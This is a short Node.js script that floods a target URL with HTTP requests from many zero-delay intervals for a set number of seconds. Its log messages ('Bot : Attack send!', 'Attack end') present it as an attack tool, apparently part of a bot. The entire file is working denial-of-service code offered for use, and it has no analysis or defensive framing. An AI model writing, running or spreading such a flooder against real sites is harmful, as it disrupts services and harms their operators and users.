const request = require('request');
const target = process.argv[2];
const thread = parseInt(process.argv[3]);
const t = parseInt(process.argv[4]);
console.log("Bot : Attack send!");

const until = new Date(Date.now() + t * 1000);
for (let i = 0; i < thread; i++) {
  setInterval(() => {
    if (new Date() > until) {
      return;
    }
    request({url : target, timeout: 20000}, (error) => {
      if (error){
      }
    });
  }, 0);
}

setTimeout(() => {
  console.log("Attack end");
  process.exit(1);
}, t * 1000);